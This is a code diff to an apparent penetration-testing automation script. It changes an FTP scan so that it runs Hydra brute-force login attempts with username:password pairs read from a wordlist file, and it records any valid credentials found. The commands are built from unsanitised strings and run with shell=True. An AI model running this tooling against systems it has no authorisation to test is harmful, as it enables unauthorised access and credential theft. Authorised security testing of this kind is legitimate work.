@@ -25,21 +25,28 @@ def ftp_scan(settings, n, m):
     notes += '\n Command: ' + ftpnmap
     results = subprocess.check_output(ftpnmap, shell=True)
     notes += results.decode('ascii')
+    notes += '\n\n' + '~' * 20
+    notes += '\n Hydra Results'
+    notes += '\n' + '~' * 20
     # except:
     #     print("[ERROR] [host: %s] {ftp_scan} nmap Enumeration Failed" % settings.targets[n].ip)
 
     try:
         outfile = out_dir + "hydra-ftp"
         print("[INFO] [host: %s] {ftp_scan} starting ftp hydra" % settings.targets[n].ip, file=omnilog)
-        HYDRA = settings.proxypass + "hydra -t 4 -I -L /opt/wordlists/userlist -P " \
-                "/opt/wordlists/offsecpass " \
-                "-f -o %s -u %s -s %s ftp" % (
-        outfile, tar_ip, port)
-        results = subprocess.check_output(HYDRA, shell=True, stderr=errfile).decode('ascii')
-        resultarr = results.split("\n")
-        for result in resultarr:
-            if "login:" in result:
-                notes += "[*] Valid ftp credentials found: " + result
+        for x in open('/opt/dev/workflow/wordlists/ftp-seclist.txt', 'r'):
+            tmp = x.split(':')
+            # HYDRA = settings.proxypass + "hydra -t 4 -I -L /opt/wordlists/userlist -P " \
+            #         "/opt/wordlists/offsecpass " \
+            #         "-f -o %s -u %s -s %s ftp" % (
+            # outfile, tar_ip, port)
+            HYDRA = settings.proxypass + "hydra -t 4 -I -l %s -p %s -f -o %s -u %s -s %s ftp" %\
+                    (tmp[1], tmp[2], outfile, tar_ip, port)
+            results = subprocess.check_output(HYDRA, shell=True, stderr=errfile).decode('ascii')
+            resultarr = results.split("\n")
+            for result in resultarr:
+                if "login:" in result:
+                    notes += "\n[*] Valid ftp credentials found: " + result
     except:
         print("[ERROR] [host: %s] {ftp_scan} HYDRA Enumeration Failed" % settings.targets[n].ip, file=omnilog)
 
